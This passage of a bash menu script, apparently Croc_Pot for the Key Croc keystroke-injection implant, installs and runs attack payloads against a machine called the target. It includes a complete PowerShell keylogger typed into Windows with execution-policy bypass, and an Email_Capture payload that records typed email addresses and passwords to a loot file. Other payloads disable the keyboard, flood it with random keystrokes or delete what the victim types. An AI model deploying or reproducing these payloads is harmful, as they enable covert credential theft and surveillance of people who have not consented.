				echo -ne "# Title:         Double_up\n#\n# Description:   Repeat user keystroke entries\n#                This will Quack once to repeat keyboard entries\n#                Recommended to uninstall payload when not in use, do to match word\n#                Press F1 to remove Double_up payload and run RELOAD_PAYLOADS command\n#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n
MATCH (SHIFT|CONTROL|BACKSPACE|ENTER|RIGHTARROW|LEFTARROW|UPARROW|DOWNARROW|TAB|GUI|ALT|DELETE|F1)\nMATCH ([0-9]|[a-z]|[A-Z]|[\`~!@#\$%^&*()_+=|;:',<\.>?/-]|[{]|[}]|[\"]|[ ])\n\nif [[ \"\$LOOT\" == \"SHIFT\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"CONTROL\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"BACKSPACE\" ]]; then
	Q BACKSPACE\nelif [[ \"\$LOOT\" == \"ENTER\" ]]; then\n	Q ENTER\nelif [[ \"\$LOOT\" == \"RIGHTARROW\" ]]; then\n	Q RIGHTARROW\nelif [[ \"\$LOOT\" == \"LEFTARROW\" ]]; then\n	Q LEFTARROW\nelif [[ \"\$LOOT\" == \"UPARROW\" ]]; then\n	Q UPARROW\nelif [[ \"\$LOOT\" == \"DOWNARROW\" ]]; then\n	Q DOWNARROW
elif [[ \"\$LOOT\" == \"TAB\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"GUI\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"ALT\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"DELETE\" ]]; then\n	Q DELETE\nelif [[ \"\$LOOT\" == \" \" ]]; then\n	Q KEYCODE 00,00,2c\nelif [[ \"\$LOOT\" == \"F1\" ]]; then\n	rm /root/udisk/payloads/Double_up.txt\n	RELOAD_PAYLOADS\nelse\n	Q STRING \"\$LOOT\"\nfi\n" > "$D_U"
				cat "$D_U" ; echo -ne "\n$LINE\n"
				ColorGreen 'DOUBLE_UP PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
}
##
#----Quack Attack Payload Continuously run random Quack commands on target
##
q_attack() {
	Info_Screen '-Quack_Attack payload match word quackattack
-Continuously run random character to target with Quack commands
-When running payload type stop to break loop
-PRESS CTRL + C to break loop in terminal'
##
#----Quack Attack payload install
##
	local Q_A=/root/udisk/payloads/Quack_Attack.txt
if [ -f "$Q_A" ]; then
	cat "$Q_A" ; echo -ne "\n$LINE\n"
	ColorGreen 'QUACK_ATTACK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
else
	read_all 'INSTALL QUACK_ATTACK PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			echo -ne "# Title:           Quack_Attack\n# Description:     Continuously run random Quack commands until stop is enter\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n#\n\nMATCH quackattack\n
SAVEKEYS /tmp/Croc_stop.txt UNTIL stop\n\nWAIT_FOR_KEYBOARD_ACTIVITY 0\nwhile true; do\nLED ATTACK\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_stop.txt.filtered) = \"stop\" ]; then\n	LED B\n	RELOAD_PAYLOADS\n	break
fi\nQ STRING \"\$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)\$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)\"\ndone\n" > "$Q_A"
			cat "$Q_A" ; echo -ne "\n$LINE\n"
			ColorGreen 'QUACK_ATTACK PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
fi
##
#----Run Quack_Attack from terminal random character or words
##
ColorYellow "Select [W]-WORDS random words [C]-CHAR random character [N]-NUMBER random number\nrandom words will use american-english-huge list\n"
read_all '[W]-WORDS [C]-CHAR [N]-NUMBER [B]-BACK'
case "$r_a" in
	[wW])
		if [ -f "/usr/share/dict/american-english-huge}" ]; then
			local WORDFILE="/usr/share/dict/american-english-huge"
		else
			install_package wamerican-huge AMERICAN_WORDLIST ; local WORDFILE="/usr/share/dict/american-english-huge"
		fi
		reset_broken
		ColorYellow "Waiting for keyboard activity\033[0K\r"
		WAIT_FOR_KEYBOARD_ACTIVITY 0
		while [ "$broken" -eq 1 ] && break || : ; do
			R_W="$(python -c 'import random; data=open("'$WORDFILE'").read().split(); print random.sample(data,1)[0]')"
			QUACK STRING "$R_W"
			QUACK KEYCODE 00,00,2c
			(( i++ ))
			ColorYellow "QUACK_ATTACK RANDOM WORD -$(ColorCyan "$R_W")$(ColorYellow '- Count: ')$(ColorGreen "$i")\033[0K\r"
		done ;;
	[cC])
		reset_broken
		ColorYellow "Waiting for keyboard activity\033[0K\r"
		WAIT_FOR_KEYBOARD_ACTIVITY 0
		while [ "$broken" -eq 1 ] && break || : ; do
			QUACK STRING "$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)"
			(( i++ ))
			ColorYellow "QUACK_ATTACK RANDOM CHAR Count: $(ColorGreen "$i")\033[0K\r"
		done ;;
	[nN])
		reset_broken
		local NUMBER_N=1000000
		ColorYellow "Waiting for keyboard activity\033[0K\r"
		WAIT_FOR_KEYBOARD_ACTIVITY 0
		while [ "$broken" -eq 1 ] && break || : ; do
			R_N="$(( RANDOM % NUMBER_N+1 ))"
			QUACK STRING "$R_N"
			QUACK KEYCODE 00,00,2c
			(( i++ ))
			ColorYellow "QUACK_ATTACK RANDOM NUMBER -$(ColorCyan "$R_N")$(ColorYellow '- Count: ')$(ColorGreen "$i")\033[0K\r"
		done ;;
	[bB])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
esac
} 2>/dev/null
##
#----Keyboard_Killer Payload stop all keyboard active with ATTACKMODE OFF command
##
kb_killer() {
	Info_Screen '-Keyboard_Killer payload match word killkeyboard
-Stop all keyboard active with ATTACKMODE OFF command
-Any keyboard activity will run ATTACKMODE OFF command
-Any keyboard inactivity for 10 sec will run ATTACKMODE HID 
-When running payload type stop to break loop
-PRESS CTRL + C to break loop in terminal'
##
#----Keyboard_Killer payload install
##
	local kb_k=/root/udisk/payloads/Keyboard_Killer.txt
if [ -f "$kb_k" ]; then
	cat "$kb_k" ; echo -ne "\n$LINE\n"
	ColorGreen 'KEYBOARD_KILLER PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
else
	read_all 'INSTALL KEYBOARD_KILLER PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			echo -ne "# Title:           Keyboard_Killer\n# Description:     Stop all keyboard active with ATTACKMODE OFF command\n#                  Type stop to end loop\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n
MATCH killkeyboard\n\nSAVEKEYS /tmp/keyboard_stop.txt UNTIL stop\n\nwhile true; do\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/keyboard_stop.txt.filtered) = \"stop\" ]; then\n	LED G\n	RELOAD_PAYLOADS\n	break\nelse
	if WAIT_FOR_KEYBOARD_ACTIVITY 1; then\n	ATTACKMODE OFF\n	LED ATTACK\n	fi\n	if WAIT_FOR_KEYBOARD_INACTIVITY 10; then\n	ATTACKMODE HID\n	LED B\n	fi\nfi\ndone\n" > "$kb_k"
			cat "$kb_k" ; echo -ne "\n$LINE\n"
			ColorGreen 'KEYBOARD_KILLER PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
fi
##
#----Keyboard_Killer payload run from terminal
##
read_all 'START KEYBOARD_KILLER IN TERMINAL Y/N AND PRESS [ENTER]'
case "$r_a" in
	[yY] | [yY][eE][sS])
		reset_broken
		ColorYellow "Waiting for keyboard activity\033[0K\r"
		while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0 ; do
			(( i++ ))
			ColorYellow "keyboard: $(ColorRed 'deactivated ')$(ColorYellow 'COUNT: ')$(ColorGreen "$i")\033[0K\r"
			ATTACKMODE OFF &>/dev/null
			ColorYellow "keyboard will reactivate in 10 sec\033[0K\r"
			WAIT_FOR_KEYBOARD_INACTIVITY 10
			(( i++ ))
			ColorYellow "keyboard: $(ColorGreen 'activated ')$(ColorYellow 'COUNT: ')$(ColorGreen "$i")\033[0K\r"
			ATTACKMODE HID &>/dev/null
		done ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
esac
}
##
#----Croc_Attackmode payload Start keycroc Attackmode commands by entering match word
##
attack_mode() {
	Info_Screen '-Croc_Attackmode payload
-Select which attackmode command to enter by match word:

storagemode <-- will execute ATTACKMODE HID STORAGE
hidmode <-- will execute ATTACKMODE HID
offmode <-- will execute ATTACKMODE OFF
reloadmode <-- will execute RELOAD_PAYLOADS
armingmode <-- will execute ARMING_MODE
rostoragemode <-- will execute ATTACKMODE RO_STORGE
autoethernet <-- will execute ATTACKMODE HID AUTO_ETHERNET
serialmode <-- will execute ATTACKMODE HID SERIAL

-On some attackmode command after running reset keycroc
by unplugging keycroc and plug back in'
##
#----Croc_Attackmode payload install
##
	local Croc_Attackmode=/root/udisk/payloads/Croc_Attackmode.txt
	if [ -f "$Croc_Attackmode" ]; then
		cat "$Croc_Attackmode" ; echo -ne "\n$LINE\n"
		ColorGreen 'CROC_ATTACKMODE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL CROC_ATTACKMODE PAYLOAD Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				echo -ne "# Title:         Croc Attack_mode\n#\n# Description:   Enter keycroc ATTACKMODE commands with payload just enter match word\n#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n
MATCH (storagemode|hidmode|offmode|reloadmode|armingmode|rostoragemode|autoethernet|serialmode)\n\ncase \$LOOT in\n	storagemode) ATTACKMODE HID STORAGE ;;\n	hidmode) ATTACKMODE HID ;;\n	offmode) ATTACKMODE OFF ;;
	reloadmode) RELOAD_PAYLOADS ;;\n	armingmode) ARMING_MODE ;;\n	rostoragemode) ATTACKMODE RO_STORGE ;;\n	autoethernet) ATTACKMODE HID AUTO_ETHERNET ;;\n	serialmode) ATTACKMODE HID SERIAL ;;\nesac\n" > "$Croc_Attackmode"
				cat "$Croc_Attackmode" ; echo -ne "\n$LINE\n"
				ColorGreen 'CROC_ATTACKMODE PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
}
##
#----Delete_Char payload delete all character on target by payload/terminal/ or at will
##
Delete_Char() {
	Info_Screen '-Delete_Char payload match word deletechar
-Run from payload, terminal or press backspace at will
-Delete character on target
-Continuously run QUACK BACKSPACE
[I] Install Delete_Char payload, type stop to break loop
[T] Run from terminal, PRESS CTRL + C to break loop
[P] Press BACKSPACE at will, anything else will break loop
[N] Return back to menu'
	read_all '[I]-INSTALL [T]-TERMINAL [P]-PRESS [N]-NONE AND PRESS [ENTER]'
	case "$r_a" in
		[Ii])
			Info_Screen '-Installing Delete_Char payload
-Match word deletechar
-Type stop to break loop'
			local D_C=/root/udisk/payloads/Delete_Char.txt
			if [ -f "$D_C" ]; then
				cat "$D_C" ; echo -ne "\n$LINE\n"
				ColorGreen 'DELETE CHAR PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
			else
				echo -ne "# Title:           Delete Char\n# Description:     Continuously run Q backspace, delete all character\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n
MATCH deletechar\n\nSAVEKEYS /tmp/Croc_stop.txt UNTIL stop\nWAIT_FOR_KEYBOARD_ACTIVITY 0\nwhile true; do\nLED ATTACK\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_stop.txt.filtered) = \"stop\" ]; then
	LED B\n	RELOAD_PAYLOADS\n	break\nelse\n	Q BACKSPACE\n	Q BACKSPACE\nfi\ndone\n" > "$D_C"
				cat "$D_C" ; echo -ne "\n$LINE\n"
				ColorGreen 'DELETE CHAR PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n'
			fi ;;
		[Tt])
			Info_Screen '-Any keyboard activity run QUACK BACKSPACE 4 times
-PRESS CTRL + C to break loop'
			reset_broken
			ColorYellow "Waiting for keyboard activity\033[0K\r"
			while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
				QUACK BACKSPACE
				QUACK BACKSPACE
				QUACK BACKSPACE
				QUACK BACKSPACE
				(( i++ ))
				ColorYellow "BACKSPACE COUNT:$(ColorGreen " $i ")\033[0K\r"
			done 2>/dev/null ;;
		[Pp])
			Info_Screen '-Press BACKSPACE at will
-Press anything else will break loop'
			local i=1
			ColorYellow 'PRESS BACKSPACE AT WILL\n'
			while IFS= read -r -n 1 -s; do
				case "$REPLY" in
					$'\177')
						QUACK BACKSPACE
						(( i++ ))
						ColorYellow "BACKSPACE COUNT:$(ColorGreen " $i ")\033[0K\r" ;;
					*)
						break ;;
				esac
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Log Windows keystrokes & save to loot/Croc_Pot (this not keycroc keystrokes logging)
##
keystrokes_laptop() {
	echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $(OS_CHECK)\n"
	Info_Screen '-With this payload log keystrokes from windows laptop pc
-May need to disable windows defender for this to work
-TO STOP THE PAYLOAD PRESS Ctrl + c
-When stop this will open up notepad and save to loot/Croc_Pot'
if [ "$(OS_CHECK)" = WINDOWS ]; then
	ATTACKMODE HID STORAGE
	sleep 5 ; Q GUI r ; sleep 2 ; Q STRING "powershell -nop -ex Bypass" ; Q ENTER ; sleep 1
	Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
	Q ENTER ; sleep 1
	Q STRING "function Test-KeyLogger(\$LOOTDIR=\"\$Croc\loot\Croc_Pot\winkeylogger.txt\")"
	Q ENTER ; Q STRING "{" ; Q ENTER
##
#----API declaration
##
	Q STRING "\$APIsignatures = @'" ; Q ENTER
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)]" ; Q ENTER 
	Q STRING "public static extern short GetAsyncKeyState(int virtualKeyCode);" ; Q ENTER 
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]" ; Q ENTER
	Q STRING "public static extern int GetKeyboardState(byte[] keystate);" ; Q ENTER
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]" ; Q ENTER
	Q STRING "public static extern int MapVirtualKey(uint uCode, int uMapType);" ; Q ENTER
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]" ; Q ENTER
	Q STRING "public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);" ; Q ENTER
	Q STRING "'@" ; Q ENTER
	Q STRING "\$API = Add-Type -MemberDefinition \$APIsignatures -Name 'Win32' -Namespace API -PassThru" ; Q ENTER
##
#----output file
##
	Q STRING "\$no_output = New-Item -Path \$LOOTDIR -ItemType File -Force" ; Q ENTER
	Q STRING "try" ; Q ENTER ; Q STRING "{" ; Q ENTER
	Q STRING "Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red" ; Q ENTER
	Q STRING "while (\$true) {" ; Q ENTER ; Q STRING "Start-Sleep -Milliseconds 40" ; Q ENTER
	Q STRING "for (\$ascii = 9; \$ascii -le 254; \$ascii++) {" ; Q ENTER
##
#----get key state
##
	Q STRING "\$keystate = \$API::GetAsyncKeyState(\$ascii)" ; Q ENTER
##
#----if key pressed
##
	Q STRING "if (\$keystate -eq -32767) {" ; Q ENTER ; Q STRING "\$null = [console]::CapsLock" ; Q ENTER
##
#----translate code
##
	Q STRING "\$virtualKey = \$API::MapVirtualKey(\$ascii, 3)" ; Q ENTER
##
#----get keyboard state and create stringbuilder
##
	Q STRING "\$kbstate = New-Object Byte[] 256" ; Q ENTER ; Q STRING "\$checkkbstate = \$API::GetKeyboardState(\$kbstate)" ; Q ENTER
	Q STRING "\$loggedchar = New-Object -TypeName System.Text.StringBuilder" ; Q ENTER
##
#----translate virtual key
##
	Q STRING "if (\$API::ToUnicode(\$ascii, \$virtualKey, \$kbstate, \$loggedchar, \$loggedchar.Capacity, 0))" ; Q ENTER ; Q STRING "{" ; Q ENTER
##
#----if success, add key to logger file
##
	Q STRING "[System.IO.File]::AppendAllText(\$LOOTDIR, \$loggedchar, [System.Text.Encoding]::Unicode)" ; Q ENTER 
	Q STRING "}" ; Q ENTER ; Q STRING "}" ; Q ENTER ; Q STRING "}" ; Q ENTER ; Q STRING "}" ; Q ENTER ; Q STRING "}"
	Q ENTER ; Q STRING "finally" ; Q ENTER ; Q STRING "{" ; Q ENTER ; Q STRING "notepad \$LOOTDIR" ; Q ENTER ; Q STRING "}"
	Q ENTER ; Q STRING "}" ; Q ENTER ; Q STRING "Test-KeyLogger" ; Q ENTER ; LED ATTACK
else
	ColorRed "The KeyCroc is not pluged into Windows pc This will not work on this OS $(OS_CHECK)\n"
fi
}
##
#----Restricted_words payload Delete, lock keyboard and close current application
##
Restricted_words() {
	Info_Screen '-Restricted words payload
-Delete, lock keyboard for 10 sec and close current application
with match word edit payload with any words of choice
-Idle for parental control

Default words:
sex|porn|sudo|administrator|admin|password|username|facebook'
	local restricted_word=/root/udisk/payloads/Restricted_words.txt
	if [ -f "$restricted_word" ]; then
		cat "$restricted_word" ; echo -ne "\n$LINE\n"
		ColorGreen 'RESTRICTED WORDS PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL RESTRICTED WORDS PAYLOAD Y/N AND PRESS [ENTER]'
			case "$r_a" in
			[yY] | [yY][eE][sS])
				echo -ne "# Title:           Restricted words\n# Description:     Delete, lock keyboard for 10 sec and close current application with match word\n#                  edit with any words, idle for parental control
# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n\nMATCH (sex|porn|sudo|administrator|admin|password|username|facebook)\n\nLED ATTACK
Q CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ ALT-F4\nQ ALT-F4\nATTACKMODE OFF\nWAIT_FOR_KEYBOARD_INACTIVITY 10\nATTACKMODE HID\nLED B\nsleep 1\nLED OFF\n" > "$restricted_word"
				cat "$restricted_word" ; echo -ne "\n$LINE\n"
				ColorGreen 'RESTRICTED WORDS IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
			esac
	fi
}
##
#----Capture target E-mail address & password save to /udisk/tools/target_email.txt
##
Email_Capture() {
	Info_Screen 'Email-Capture payload
-Capture target E-mail address & password save to /udisk/tools/target_email.txt
-This should work on all operating systems

This payload will use KeyCroc MATCH command using regular expressions pattern'
	if [ -f "/root/udisk/tools/target_email.txt" ]; then
		ColorYellow "CURRENTLY CAPTURE E-MAILS:\n"
		cat /root/udisk/tools/target_email.txt
		echo -ne "\n$LINE\n"
	fi
	local Email_CAPTURE=/root/udisk/payloads/Email_Capture.txt
	if [ -f "$Email_CAPTURE" ]; then
		cat "$Email_CAPTURE" ; echo -ne "\n$LINE\n"
		ColorGreen "EMAIL-CAPTURE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER$clear\n"
	else
		read_all 'INSTALL EMAIL-CAPTURE PAYLOAD Y/N AND PRESS [ENTER]'
			case "$r_a" in
			[yY] | [yY][eE][sS])
				echo -ne "# Title:         Email-Capture\n# Description:   Capture target E-mail address & password save to /udisk/tools/target_email.txt\n# Author:        Spywill\n# Version:       1.1\n# Category:      Key Croc\n
MATCH (^[a-zA-Z0-9_\-\.]+@[a-zA-Z0-9_\-\.]+\.[a-zA-Z]{3,5}\$)\n\npattern='^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{3,5})\$'\n\nEMAIL_PASS() {\n	until [ -f /tmp/target_email_pw.txt.filtered ]; do\n		:
	done\n	LED G\n	cat /tmp/target_email_pw.txt.filtered >> /root/udisk/tools/target_email.txt\n	rm /tmp/target_email_pw.txt /tmp/target_email_pw.txt.filtered\n	LED OFF\n	RELOAD_PAYLOADS\n}\n
if [[ \"\$LOOT\" =~ \$pattern ]]; then\n	LED B\n	echo \"\$LOOT\" >> /root/udisk/tools/target_email.txt\nelse\n	LED R\n	killall -9 bash\n	killall -9 python\n	sleep 1\n	LED OFF\n	RELOAD_PAYLOADS
fi\n\nSAVEKEYS /tmp/target_email_pw.txt UNTIL ENTER\nLED OFF\nEMAIL_PASS" > "$Email_CAPTURE"
				cat "$Email_CAPTURE" ; echo -ne "\n$LINE\n"
				ColorGreen "EMAIL-CAPTURE IS NOW INSTALLED CHECK PAYLOADS FOLDER$clear\n" ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
			esac
	fi
}
##
#----Install Payloads Menu
##
MenuTitle 'INSTALL PAYLOADS MENU'
MenuColor 22 1 'CROC GETONLINE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 11 'CROC LOCKOUT PAYLOAD' | sed 's/\t//g'
MenuColor 22 2 'CROC UNLOCK PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 12 'WINDOWS DEFENDER' | sed 's/\t//g'
MenuColor 22 3 'WIFI SETUP PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 13 'CROC CLOSE_IT PAYLOAD' | sed 's/\t//g'
MenuColor 22 4 'QUICK START CROC_POT' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 14 'DOUBLE UP PAYLOAD' | sed 's/\t//g'
MenuColor 22 5 'CROC SHOT PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 15 'QUACK_ATTACK PAYLOAD' | sed 's/\t//g'
MenuColor 22 6 'CROC BITE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 16 'KEYBOARD KILLER' | sed 's/\t//g'
MenuColor 22 7 'CROC REDIRECT PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 17 'KEYCROC ATTACKMODE' | sed 's/\t//g'
MenuColor 22 8 'NO SLEEPING PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 18 'DELETE CHAR PAYLOAD' | sed 's/\t//g'
MenuColor 22 9 'CROC REPLACE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 19 'KEYSTROKES LAPTOP' | sed 's/\t//g'
MenuColor 21 10 'CROC FORCE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 20 'RESTRICTED WORDS' | sed 's/\t//g'
MenuColor 22 21 'EMAIL-CAPTURE PAYLOAD' ; MenuColor 22 22 'RETURN TO MAIN MENU'
MenuEnd 22
	case "$m_a" in
		1) get_online_payload ; install_payloads_menu ;;
		2) croc_unlock_payload ; install_payloads_menu ;;
		3) wifi_setup_payload ; install_payloads_menu ;;
		4) quick_croc_pot ; install_payloads_menu ;;
		5) screen_shot ; install_payloads_menu ;;
		6) croc_bite ; install_payloads_menu ;;
		7) web_site ; install_payloads_menu ;;
		8) screen_on ; install_payloads_menu ;;
		9) text_replace ; install_payloads_menu ;;
		10) Brute_force ; install_payloads_menu ;;
		11) croc_lock ; install_payloads_menu ;;
		12) windows_defender ;;
		13) close_it ; install_payloads_menu ;;
		14) double_up ; install_payloads_menu ;;
		15) q_attack ; install_payloads_menu ;;
		16) kb_killer ; install_payloads_menu ;;
		17) attack_mode ; install_payloads_menu ;;
		18) Delete_Char ; install_payloads_menu ;;
		19) keystrokes_laptop ; install_payloads_menu ;;
		20) Restricted_words ; install_payloads_menu ;;
		21) Email_Capture ; install_payloads_menu ;;
		22) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; install_payloads_menu ;;
		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; install_payloads_menu ;;
	esac
}
##
#----O.MG cable Menu/Functions
##
function omg_cable() {
	local omg_v=/root/udisk/tools/Croc_Pot/OMG_WIFI.txt
	Info_Screen '- 1 connect keycroc to O.MG wifi access point
- 2 Start O.MG web UI ensure keycroc is connected to O.MG AP first
- 3 O.MG Github web page
- 4 Create payload to connect Quickly to O.MG wifi access point
- 5 Scan local network for O.MG cable'
##
#----O.MG connect keycroc to O.MG wifi access point
##
omg_wifi() {
	Info_Screen '-Connect keycroc wifi to O.MG wifi access point
-Ensure O.MG cable is setup as wifi access point
-The purpose to this is access O.MG cable or Keycroc remotely
from a remote device that is connected to O.MG wifi access point

O.MG C-to-C Directional Keylogger with the keycroc
-USB adapters:
one usb usb-A female to usb-A female extension adapter coupler
Two usb-A male to usb-C female

-Plug keyboard into one end of the usb-A female coupler other end of
the usb-A female coupler plug one of the usb-A to usb-C adapter
then plug in the usb-C inactive end of the O.MG cable.
The other usb-A to usb-C adapter is plugged into the keycroc
plug the active end of the O.MG cable into the keycroc and
plug the keycroc into target

-On a remote device connect to O.MG wifi access point
start web browser enter http://192.168.4.1 to open O.MG web UI
on same device open a terminal start ssh session with keycroc
IP should be 192.168.4.2 or 192.168.4.3'
##
#----O.MG scan for O.MG wifi access point
##
if [ -e "$omg_v" ]; then
	local scan_ssid=$(iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n 's/.*\('$(sed -n 1p $omg_v)'\).*/\1/p')
	if [ "$(sed -n 1p $omg_v)" = "$scan_ssid" ]; then
		iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/'$(sed -n 1p $omg_v)'/p'
		ColorGreen 'O.MG wifi access point online\n'
	else
		ColorRed 'O.MG wifi access point offline\n'
		iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
	fi
else
	read_all 'ENTER O.MG SSID AND PRESS [ENTER]'
	local scan_ssid=$(iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n 's/.*\("$r_a"\).*/\1/p')
	if [ "$r_a" = "$scan_ssid" ]; then
		iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/"$r_a"/p'
		ColorGreen 'O.MG wifi access point online\n'
	else
		ColorRed 'O.MG wifi access point offline\n'
		iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
	fi
fi
##
#----O.MG start connection, connect keycroc to O.MG wifi ap
##
	read_all 'START CONNECTION Y/N AND PRESS [ENTER]'
case "$r_a" in
[yY] | [yY][eE][sS])
	CONNECT_OMG() {
		ColorYellow 'Connecting to O.MG WIFI access point\nThis SSH session will terminate\n'
		LED SETUP
		kill -9 $(pidof wpa_supplicant) && kill -9 $(pidof dhclient)
		ifconfig wlan0 down
		sed -i -E -e '/^[WS]/d' -e '14 a WIFI_SSID '"$(sed -n 1p "$omg_v")"'\nWIFI_PASS '"$(sed -n 2p $omg_v)"'\nSSH ENABLE' /root/udisk/config.txt
		wpa_passphrase $(sed -n 1p "$omg_v") $(sed -n 2p "$omg_v") > /etc/wpa_supplicant.conf
		ifconfig wlan0 up
		wpa_supplicant -B -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf && dhclient wlan0
		sleep 3
		systemctl restart ssh.service
		LED G ; sleep 2 ; LED OFF
		exit
	}
	if [ -e "$omg_v" ]; then
		ColorYellow 'FOUND EXISTING O.MG WIFI CREDENTIALS\n'
		iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/'"$(sed -n 1p $omg_v)"'/p'
		read_all 'USE EXISTING O.MG CREDENTIALS AND CONNECT Y/N AND PRESS [ENTER]'
		case "$r_a" in
		[yY] | [yY][eE][sS])
			CONNECT_OMG ;;
		[nN] | [nN][oO])
			rm "$omg_v"
			read_all 'ENTER O.MG SSID AND PRESS [ENTER]' ; echo "$r_a" >> "$omg_v"
			ColorYellow 'Checking for O.MG wifi access point \n'
			iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
			ColorYellow 'ENTER O.MG WIFI CREDENTIALS\n'
